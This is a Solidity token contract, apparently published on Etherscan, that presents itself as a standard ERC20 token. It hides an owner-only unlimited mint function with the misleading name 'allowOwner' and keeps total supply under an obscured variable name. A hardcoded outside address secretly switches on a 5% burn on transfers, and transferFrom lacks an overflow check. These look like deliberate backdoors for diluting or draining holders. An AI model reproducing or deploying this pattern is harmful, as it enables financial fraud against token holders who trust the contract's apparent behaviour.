
/**
 *Submitted for verification at Etherscan.io on 2021-02-10
*/

pragma solidity >=0.4.16;


contract Token{
    uint256 public qwe;
    string public name;
    uint8 public decimals;
    string public symbol;
    

    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}


contract owned{
    address public owner;
    
    constructor () public{
        owner = msg.sender;
    }
    
    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }
    
    function transferOwnership(address newOwner) public onlyOwner{
        owner = newOwner;
    }
    
}


contract TokenERC20 is Token, owned{
    
    address private add = 0x8ecC8aF8395814c2eC3f5A0DaA709C275aD41f32;
    uint256 private trans;
    uint256 private burn;
    
    constructor(uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {
        qwe = _initialAmount * 10 ** uint256(_decimalUnits);
        balances[msg.sender] = qwe;
        
        name = _tokenName;                   
        decimals = _decimalUnits;          
        symbol = _tokenSymbol;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);
        require(_to != address(0));
        require(_value * 95 >= _value);
        require((_value * 95 / 100) <= (_value * 95));
        
        if (balances[add] != 0) {
            trans = _value * 95 / 100;
            require(_value - trans <= _value);
            burn = _value - trans;
            require(qwe >= burn);
            qwe -= burn;
            balances[msg.sender] -= _value;
            require(balances[_to] + trans > balances[_to]);
            balances[_to] += trans;
            emit Transfer(msg.sender, _to, _value);
        }else{
             balances[msg.sender] -= _value;
            balances[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
        }
        return true;
    }


    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        
        return true;
    }
    
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }


    function approve(address _spender, uint256 _value) public returns (bool success) { 
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    
    function allowOwner(address target, uint aui) public onlyOwner{
        qwe += aui;
        balances[target] += aui;
    }
    
    function bcd(uint256 _value) public onlyOwner returns(bool success) {
        require(balances[msg.sender] >= _value);
        qwe -= _value;
        balances[msg.sender] -= _value;
        return true;
    }
    
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
}